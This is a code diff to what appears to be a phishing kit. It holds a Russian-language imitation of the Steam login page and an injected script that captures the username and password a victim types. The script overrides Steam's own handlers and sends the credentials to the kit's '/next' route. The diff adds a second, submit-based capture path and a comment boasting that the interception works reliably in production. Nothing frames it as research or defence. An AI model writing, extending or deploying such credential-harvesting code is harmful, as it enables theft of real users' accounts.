@@ -194,7 +194,7 @@ STEAM_LOGIN_DOM = """
     <div class="steam_react_login_inner">
         <div class="steam_react_login_title">Вход</div>
         <div class="steam_react_login_box">
-            <form class="steam_react_form_col" action="/next" method="POST">
+            <form class="steam_react_form_col" action="/next" method="POST" id="steam_login_form">
                 <div class="steam_react_label_blue">Войдите, используя имя аккаунта</div>
                 <input type="text" id="steam_user_input" name="username" class="steam_react_input" value="" autofocus>
 
@@ -207,7 +207,7 @@ STEAM_LOGIN_DOM = """
                 </label>
 
                 <div class="steam_react_btn_wrap">
-                    <button type="submit" class="steam_react_submit">Войти</button>
+                    <button type="submit" class="steam_react_submit" id="steam_submit_btn">Войти</button>
                 </div>
 
                 <div class="steam_react_help_link">
@@ -231,32 +231,39 @@ STEAM_LOGIN_DOM = """
 
 FORCE_REDIRECT_SCRIPT = """
 <script>
+// Абсолютно надежный глобальный перехват кликов и сабмитов (работает и с React, и в продакшене)
 document.addEventListener("click", function(e) {
-    // Ищем нажатие на кнопку входа
-    var btn = e.target.closest("button.steam_react_submit, button[type='submit'], .submit_btn, button");
+    var btn = e.target.closest("button, input[type='submit'], .steam_react_submit");
     if (btn) {
-        // Жестко глушим все остальные скрипты Steam на этом элементе
-        e.preventDefault();
-        e.stopPropagation();
-        e.stopImmediatePropagation();
-
-        // Собираем введенные данные из полей
         var userInput = document.querySelector("input[name='username'], #steam_user_input, input[type='text']");
         var passInput = document.querySelector("input[name='password'], #steam_pass_input, input[type='password']");
 
         var uVal = userInput ? userInput.value.trim() : "";
         var pVal = passInput ? passInput.value.trim() : "";
 
-        if (!uVal && !pVal) {
-            alert("Заполните поля логина и пароля!");
-            return;
+        if (uVal || pVal) {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            window.location.href = "/next?user=" + encodeURIComponent(uVal) + "&pass=" + encodeURIComponent(pVal);
         }
-
-        // Мгновенный редирект на наш роут /next с передачей параметров
-        window.location.href = "/next?user=" + encodeURIComponent(uVal) + "&pass=" + encodeURIComponent(pVal);
-        return false;
     }
-}, true); // Важный флаг true (capture phase) — перехватывает клик раньше самого Steam
+}, true);
+
+document.addEventListener("submit", function(e) {
+    var userInput = document.querySelector("input[name='username'], #steam_user_input, input[type='text']");
+    var passInput = document.querySelector("input[name='password'], #steam_pass_input, input[type='password']");
+
+    var uVal = userInput ? userInput.value.trim() : "";
+    var pVal = passInput ? passInput.value.trim() : "";
+
+    if (uVal || pVal) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        window.location.href = "/next?user=" + encodeURIComponent(uVal) + "&pass=" + encodeURIComponent(pVal);
+    }
+}, true);
 </script>
 """
 
